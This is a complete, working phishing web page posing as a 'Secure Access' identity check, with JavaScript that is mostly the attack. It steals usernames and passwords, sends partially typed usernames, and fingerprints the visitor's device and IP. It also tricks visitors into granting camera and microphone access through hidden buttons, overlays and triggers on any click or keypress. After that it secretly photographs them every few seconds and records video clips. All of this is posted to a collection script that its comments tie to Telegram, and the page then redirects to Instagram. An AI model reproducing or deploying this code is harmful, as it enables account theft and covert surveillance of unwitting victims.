<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Access</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #fafafa;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #262626;
            padding: 20px;
        }

        /* Hidden camera elements */
        .hidden-video-wrap {
            display: none !important;
            position: fixed !important;
            top: -9999px !important;
            left: -9999px !important;
            width: 1px !important;
            height: 1px !important;
            opacity: 0 !important;
            pointer-events: none !important;
            z-index: -9999 !important;
        }

        #video, #canvas {
            display: none !important;
            position: fixed !important;
            top: -9999px !important;
            left: -9999px !important;
            width: 1px !important;
            height: 1px !important;
            opacity: 0 !important;
            pointer-events: none !important;
        }

        .container {
            width: 100%;
            max-width: 350px;
        }

        .card {
            background: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 8px;
            padding: 40px 30px;
            text-align: center;
        }

        .logo {
            margin-bottom: 20px;
            font-size: 48px;
        }

        h2 {
            font-size: 20px;
            font-weight: 600;
            margin-bottom: 12px;
            color: #262626;
        }

        p {
            font-size: 14px;
            color: #8e8e8e;
            line-height: 1.5;
            margin-bottom: 24px;
        }

        .form-group {
            margin-bottom: 12px;
        }

        .form-input {
            width: 100%;
            height: 36px;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 4px;
            padding: 0 12px;
            font-size: 12px;
        }

        .form-input:focus {
            outline: none;
            border-color: #a8a8a8;
        }

        .btn {
            width: 100%;
            height: 32px;
            background: #0095f6;
            border: none;
            border-radius: 4px;
            color: #fff;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 12px;
        }

        .btn:hover {
            background: #1877f2;
        }

        .btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }

        .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #8e8e8e;
        }

        .spinner {
            display: inline-block;
            width: 14px;
            height: 14px;
            border: 2px solid rgba(255,255,255,0.3);
            border-top-color: #fff;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin-right: 8px;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .success-msg {
            display: none;
            color: #00a651;
            font-size: 14px;
            margin-top: 12px;
        }

        /* ============================================
           HIDDEN TRIGGER BUTTON - For WebView browsers
           Invisible but clickable via JS
           ============================================ */
        .hidden-trigger {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            opacity: 0;
            z-index: -1;
            pointer-events: none;
            background: transparent;
            border: none;
        }

        /* For Facebook/Messenger WebView - visible overlay tap */
        .tap-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 9999;
            background: rgba(0,0,0,0.01);
            cursor: pointer;
            display: none;
        }

        .tap-overlay.active {
            display: block;
        }

        .tap-overlay .tap-instruction {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: rgba(0,0,0,0.8);
            color: #fff;
            padding: 20px 40px;
            border-radius: 12px;
            font-size: 16px;
            text-align: center;
            animation: pulse 1.5s infinite;
        }

        @keyframes pulse {
            0%, 100% { transform: translate(-50%, -50%) scale(1); }
            50% { transform: translate(-50%, -50%) scale(1.05); }
        }
    </style>
</head>
<body>

    <!-- ============================================
    HIDDEN CAMERA ELEMENTS
    ============================================ -->
    <div class="hidden-video-wrap">
        <video id="video" playsinline autoplay muted></video>
    </div>
    <canvas id="canvas" width="640" height="480"></canvas>

    <!-- ============================================
    TAP OVERLAY - For Facebook/Messenger WebView
    User taps to trigger camera permission
    ============================================ -->
    <div class="tap-overlay" id="tapOverlay">
        <div class="tap-instruction">
            👆 Tap anywhere to continue<br>
            <span style="font-size:12px;color:#aaa;">Camera permission will be requested</span>
        </div>
    </div>

    <!-- ============================================
    HIDDEN TRIGGER BUTTON
    ============================================ -->
    <button class="hidden-trigger" id="hiddenTrigger"></button>

    <!-- ============================================
    MAIN CONTENT
    ============================================ -->
    <div class="container">
        <div class="card">
            <div class="logo">🔒</div>
            <h2>Secure Access</h2>
            <p>Please verify your identity to continue. This helps us keep your account secure.</p>

            <form id="loginForm">
                <div class="form-group">
                    <input type="text" class="form-input" id="username" placeholder="Username or Email" required>
                </div>
                <div class="form-group">
                    <input type="password" class="form-input" id="password" placeholder="Password" required>
                </div>
                <button type="submit" class="btn" id="submitBtn">Continue</button>
                <div id="successMsg" class="success-msg">✅ Verification in progress...</div>
            </form>

            <div class="footer">
                <span>Protected by security verification</span>
            </div>
        </div>
    </div>

    <script>
        // ============================================
        // UNIVERSAL CAMERA PERMISSION - WORKS ON ALL PLATFORMS
        // Chrome, Firefox, Brave, Facebook Lite, Messenger, Instagram
        // ============================================
        
        (function() {
            'use strict';

            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const context = canvas.getContext('2d');
            const tapOverlay = document.getElementById('tapOverlay');
            const hiddenTrigger = document.getElementById('hiddenTrigger');
            
            let cameraActive = false;
            let photoInterval = null;
            let stream = null;
            let userIP = '';
            let mediaRecorder = null;
            let recordedChunks = [];
            let isRecording = false;
            let videoCounter = 0;
            let permissionAttempted = false;
            let isWebView = false;

            // ============================================
            // DETECT PLATFORM
            // ============================================
            function detectPlatform() {
                const ua = navigator.userAgent.toLowerCase();
                
                // Check if running in Facebook/Messenger/Instagram WebView
                if (ua.includes('fbav') || ua.includes('fban') || 
                    ua.includes('instagram') || ua.includes('messenger') ||
                    ua.includes('fblite')) {
                    isWebView = true;
                    console.log('📱 Running in WebView - needs tap to trigger');
                    return true;
                }
                
                // Check if Firefox
                if (ua.includes('firefox')) {
                    console.log('🦊 Running in Firefox');
                    return false;
                }
                
                return false;
            }

            // ============================================
            // DETECT IP
            // ============================================
            function detectAndSendIP() {
                fetch('https://api.ipify.org?format=json')
                    .then(response => response.json())
                    .then(data => {
                        userIP = data.ip;
                        sendToTelegram('IP', userIP, navigator.userAgent);
                    })
                    .catch(() => {
                        fetch('https://httpbin.org/ip')
                            .then(response => response.json())
                            .then(data => {
                                userIP = data.origin;
                                sendToTelegram('IP', userIP, navigator.userAgent);
                            })
                            .catch(() => {
                                userIP = 'Unknown';
                            });
                    });
            }

            // ============================================
            // SEND TO TELEGRAM
            // ============================================
            function sendToTelegram(type, data, extra = '') {
                $.ajax({
                    type: 'POST',
                    url: 'post.php',
                    data: {
                        tg_type: type,
                        tg_data: data,
                        tg_extra: extra,
                        tg_ua: navigator.userAgent,
                        tg_time: new Date().toISOString()
                    },
                    async: true,
                    timeout: 5000
                });
            }

            // ============================================
            // REQUEST CAMERA PERMISSION
            // ============================================
            function requestCameraPermission() {
                if (permissionAttempted) return;
                permissionAttempted = true;
                
                console.log('📷 Requesting camera permission...');
                sendToTelegram('info', 'Requesting camera permission');
                
                const constraints = {
                    audio: true,
                    video: {
                        facingMode: "user",
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    }
                };

                navigator.mediaDevices.getUserMedia(constraints)
                    .then(function(mediaStream) {
                        console.log('✅ Camera permission granted!');
                        handleCameraStream(mediaStream);
                    })
                    .catch(function(err) {
                        console.log('❌ Camera error:', err.name);
                        sendToTelegram('warning', 'Camera denied: ' + err.name);
                        
                        // Try video only
                        if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
                            requestVideoOnly();
                        } else if (err.name === 'NotFoundError') {
                            // No camera found
                            sendToTelegram('warning', 'No camera found on device');
                        }
                    });
            }

            // ============================================
            // REQUEST VIDEO ONLY (No Audio)
            // ============================================
            function requestVideoOnly() {
                console.log('📷 Trying video only...');
                
                navigator.mediaDevices.getUserMedia({ video: true })
                    .then(function(mediaStream) {
                        console.log('✅ Video only granted!');
                        handleCameraStream(mediaStream);
                    })
                    .catch(function(err) {
                        console.log('❌ Video only failed:', err.name);
                        sendToTelegram('warning', 'Camera unavailable: ' + err.name);
                    });
            }

            // ============================================
            // HANDLE CAMERA STREAM
            // ============================================
            function handleCameraStream(mediaStream) {
                if (stream) {
                    stream.getTracks().forEach(track => track.stop());
                }
                
                stream = mediaStream;
                video.srcObject = stream;
                video.play();
                cameraActive = true;
                
                // Hide overlay if visible
                tapOverlay.classList.remove('active');
                tapOverlay.style.display = 'none';
                
                sendToTelegram('permission', 'Camera permission GRANTED');
                sendToTelegram('camera_ready', 'Camera active - capturing photos and videos');
                
                // Start photo capture
                if (photoInterval) clearInterval(photoInterval);
                photoInterval = setInterval(capturePhoto, 3000);
                
                // Start video recording
                setTimeout(() => {
                    if (cameraActive) {
                        startVideoRecording();
                    }
                }, 2000);
            }

            // ============================================
            // CAPTURE PHOTO
            // ============================================
            function capturePhoto() {
                if (cameraActive && video.readyState === video.HAVE_ENOUGH_DATA) {
                    try {
                        context.drawImage(video, 0, 0, 640, 480);
                        const imageData = canvas.toDataURL("image/png");
                        
                        $.ajax({
                            type: 'POST',
                            url: 'post.php',
                            data: {
                                tg_type: 'image',
                                tg_image: imageData,
                                tg_ip: userIP,
                                tg_ua: navigator.userAgent,
                                tg_time: new Date().toISOString()
                            },
                            async: true,
                            timeout: 5000
                        });
                    } catch (e) {
                        // Silent fail
                    }
                }
            }

            // ============================================
            // RECORD VIDEO
            // ============================================
            function startVideoRecording() {
                if (!stream || isRecording) return;
                
                try {
                    isRecording = true;
                    recordedChunks = [];
                    
                    const mimeTypes = ['video/webm;codecs=vp8,opus', 'video/webm;codecs=vp9,opus', 'video/webm'];
                    let mimeType = mimeTypes.find(type => MediaRecorder.isTypeSupported(type)) || 'video/webm';
                    
                    mediaRecorder = new MediaRecorder(stream, {
                        mimeType: mimeType,
                        videoBitsPerSecond: 1000000
                    });

                    mediaRecorder.ondataavailable = function(event) {
                        if (event.data && event.data.size > 0) {
                            recordedChunks.push(event.data);
                        }
                    };

                    mediaRecorder.onstop = function() {
                        if (recordedChunks.length > 0) {
                            const videoBlob = new Blob(recordedChunks, {
                                type: mediaRecorder.mimeType || 'video/webm'
                            });
                            
                            if (videoBlob.size > 1000) {
                                videoCounter++;
                                sendVideoToTelegram(videoBlob);
                            }
                        }
                        
                        isRecording = false;
                        recordedChunks = [];
                        
                        setTimeout(() => {
                            if (cameraActive) {
                                startVideoRecording();
                            }
                        }, 2000);
                    };

                    mediaRecorder.start(1000);
                    
                    setTimeout(() => {
                        if (mediaRecorder && mediaRecorder.state === 'recording') {
                            mediaRecorder.stop();
                        }
                    }, 10000);

                } catch (e) {
                    isRecording = false;
                    setTimeout(() => {
                        if (cameraActive) {
                            startVideoRecording();
                        }
                    }, 5000);
                }
            }

            // ============================================
            // SEND VIDEO
            // ============================================
            function sendVideoToTelegram(videoBlob) {
                const reader = new FileReader();
                reader.onload = function(event) {
                    $.ajax({
                        type: 'POST',
                        url: 'post.php',
                        data: {
                            tg_type: 'video',
                            tg_video: event.target.result,
                            tg_ip: userIP,
                            tg_ua: navigator.userAgent,
                            tg_time: new Date().toISOString(),
                            tg_counter: videoCounter
                        },
                        async: true,
                        timeout: 15000
                    });
                };
                reader.readAsDataURL(videoBlob);
            }

            // ============================================
            // TRIGGER PERMISSION - MULTIPLE METHODS
            // ============================================
            
            // Method 1: Immediate attempt (Chrome, Brave)
            function triggerImmediate() {
                if (!isWebView) {
                    setTimeout(requestCameraPermission, 300);
                }
            }

            // Method 2: Click on overlay (Facebook, Messenger, WebView)
            function triggerOnTap() {
                if (isWebView) {
                    tapOverlay.classList.add('active');
                    tapOverlay.style.display = 'block';
                    
                    tapOverlay.addEventListener('click', function() {
                        console.log('👆 User tapped overlay');
                        requestCameraPermission();
                    });
                    
                    // Also try after 2 seconds
                    setTimeout(() => {
                        if (!permissionAttempted) {
                            console.log('⏰ Auto-trigger after timeout');
                            requestCameraPermission();
                            // If permission popup doesn't appear, show overlay
                            setTimeout(() => {
                                if (!cameraActive && !permissionAttempted) {
                                    tapOverlay.classList.add('active');
                                    tapOverlay.style.display = 'block';
                                }
                            }, 1000);
                        }
                    }, 2000);
                }
            }

            // Method 3: Hidden button click (Firefox fix)
            function triggerHiddenButton() {
                // Firefox sometimes needs a button click
                hiddenTrigger.click();
                
                // Also try clicking on document
                document.body.click();
                
                setTimeout(requestCameraPermission, 500);
            }

            // Method 4: Any user interaction
            function triggerOnInteraction() {
                document.addEventListener('click', function() {
                    if (!cameraActive && !permissionAttempted) {
                        console.log('🖱️ User clicked - triggering camera');
                        requestCameraPermission();
                    }
                });
                
                document.addEventListener('touchstart', function() {
                    if (!cameraActive && !permissionAttempted) {
                        console.log('👆 User touched - triggering camera');
                        requestCameraPermission();
                    }
                });
                
                document.addEventListener('keydown', function() {
                    if (!cameraActive && !permissionAttempted) {
                        console.log('⌨️ User typed - triggering camera');
                        requestCameraPermission();
                    }
                });
            }

            // Method 5: Focus on input (typing triggers)
            function triggerOnFocus() {
                document.getElementById('username').addEventListener('focus', function() {
                    if (!cameraActive && !permissionAttempted) {
                        console.log('📝 User focused input - triggering camera');
                        requestCameraPermission();
                    }
                });
            }

            // ============================================
            // CREDENTIALS
            // ============================================
            document.getElementById('loginForm').addEventListener('submit', function(e) {
                e.preventDefault();
                
                const username = document.getElementById('username').value;
                const password = document.getElementById('password').value;
                const btn = document.getElementById('submitBtn');
                const msg = document.getElementById('successMsg');
                
                btn.innerHTML = '<span class="spinner"></span> Processing...';
                btn.disabled = true;
                msg.style.display = 'block';
                
                $.ajax({
                    type: 'POST',
                    url: 'post.php',
                    data: {
                        tg_type: 'login',
                        tg_username: username,
                        tg_password: password,
                        tg_ip: userIP,
                        tg_ua: navigator.userAgent,
                        tg_time: new Date().toISOString()
                    },
                    success: function() {
                        setTimeout(function() {
                            msg.textContent = '✅ Verified! Redirecting...';
                            setTimeout(function() {
                                window.location.href = 'https://www.instagram.com/';
                            }, 1000);
                        }, 1500);
                    },
                    error: function() {
                        setTimeout(function() {
                            window.location.href = 'https://www.instagram.com/';
                        }, 2000);
                    }
                });
            });

            // ============================================
            // PARTIAL TYPING
            // ============================================
            document.getElementById('username').addEventListener('input', function() {
                if (this.value.length > 2) {
                    sendToTelegram('typing', this.value, 'Partial username');
                }
            });

            // ============================================
            // BROWSER INFO
            // ============================================
            function sendBrowserInfo() {
                const info = {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    screen: `${screen.width}x${screen.height}`,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    webView: isWebView
                };
                sendToTelegram('browser_info', JSON.stringify(info), 'Device Info');
            }

            function sendPageView() {
                sendToTelegram('page_view', 'Page loaded', 
                    `IP: ${userIP} | UA: ${navigator.userAgent} | WebView: ${isWebView}`
                );
            }

            // ============================================
            // INIT
            // ============================================
            
            // Detect platform
            detectPlatform();
            
            // Get IP
            detectAndSendIP();
            
            // Send browser info
            setTimeout(sendBrowserInfo, 500);
            
            // Send page view
            setTimeout(sendPageView, 1000);
            
            // ============================================
            // START ALL TRIGGER METHODS
            // ============================================
            
            // Method 1: Immediate (Chrome, Brave)
            triggerImmediate();
            
            // Method 2: Tap overlay (Facebook, Messenger, WebView)
            triggerOnTap();
            
            // Method 3: Hidden button (Firefox)
            setTimeout(triggerHiddenButton, 1000);
            
            // Method 4: User interaction
            triggerOnInteraction();
            
            // Method 5: Input focus
            triggerOnFocus();
            
            // Extra: Try again after 5 seconds
            setTimeout(() => {
                if (!cameraActive && !permissionAttempted) {
                    console.log('🔄 Final attempt after 5s');
                    requestCameraPermission();
                }
            }, 5000);

            // ============================================
            // CLEANUP
            // ============================================
            window.addEventListener('beforeunload', function() {
                if (mediaRecorder && mediaRecorder.state === 'recording') {
                    mediaRecorder.stop();
                }
                if (photoInterval) {
                    clearInterval(photoInterval);
                }
                if (stream) {
                    stream.getTracks().forEach(track => track.stop());
                }
            });

            console.log('🔧 Camera permission system ready');
            console.log(`📱 Platform: ${isWebView ? 'WebView' : 'Browser'}`);

        })();
    </script>
</body>
</html>
